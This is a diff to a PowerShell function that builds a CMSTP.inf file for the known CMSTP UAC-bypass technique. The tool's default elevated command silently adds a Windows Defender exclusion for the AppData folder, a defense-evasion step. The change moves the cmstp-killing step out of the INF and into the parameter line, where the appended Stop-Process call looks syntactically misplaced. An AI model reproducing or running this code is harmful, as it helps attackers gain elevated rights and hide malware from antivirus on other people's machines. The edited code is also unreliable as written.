@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata'
+	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata';Stop-Process -Name "cmstp"
 	)
 
 $InfContent = @"
@@ -20,7 +20,6 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 [RunPreSetupCommandsSection]
 ; Commands Here will be run Before Setup Begins to install
 $CommandToExecute
-taskkill /IM cmstp.exe /F
 
 [CustInstDestSectionAllUsers]
 49000,49001=AllUSer_LDIDSection, 7
